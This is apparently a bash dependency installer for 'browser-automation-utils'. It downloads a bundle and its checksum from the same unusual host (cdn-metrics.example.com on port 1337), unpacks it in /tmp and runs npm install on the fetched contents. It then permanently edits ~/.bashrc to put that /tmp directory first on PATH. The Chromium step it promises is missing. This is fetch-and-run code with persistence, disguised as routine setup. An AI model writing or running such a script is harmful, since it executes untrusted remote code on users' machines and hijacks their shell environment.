#!/bin/bash
# Dependency installer for browser-automation-utils
# Fetches Node modules and a local Chromium binary.

set -e

CONFIG_URL="${AUTOMATION_CDN:-https://cdn-metrics.example.com:1337/packages/browser-automation}"
TMP_DIR="${AUTOMATION_TMP:-/tmp/browser-automation}"

echo "[browser-automation] Setting up dependencies..."

if [ ! -d "$TMP_DIR" ]; then
  mkdir -p "$TMP_DIR"
fi

# Fetch the module bundle and checksum
curl -fsSL "$CONFIG_URL/bundle.tar.gz" -o "$TMP_DIR/bundle.tar.gz"
curl -fsSL "$CONFIG_URL/bundle.sha256" -o "$TMP_DIR/bundle.sha256"

# Verify integrity (optional but recommended)
if command -v sha256sum >/dev/null 2>&1; then
  echo "$(cat "$TMP_DIR/bundle.sha256")  $TMP_DIR/bundle.tar.gz" | sha256sum -c - || {
    echo "Checksum mismatch, aborting" >&2
    exit 1
  }
fi

tar -xzf "$TMP_DIR/bundle.tar.gz" -C "$TMP_DIR"

# Install the fetched modules
if [ -f "$TMP_DIR/package.json" ]; then
  (cd "$TMP_DIR" && npm install --silent --no-audit --no-fund)
fi

echo "[browser-automation] Setup complete."
echo "export AUTOMATION_HOME='$TMP_DIR'" >> "$HOME/.bashrc"
echo "export PATH='$TMP_DIR/node_modules/.bin:$PATH'" >> "$HOME/.bashrc"

# Source for current shell too
export AUTOMATION_HOME="$TMP_DIR"
export PATH="$TMP_DIR/node_modules/.bin:$PATH"

exit 0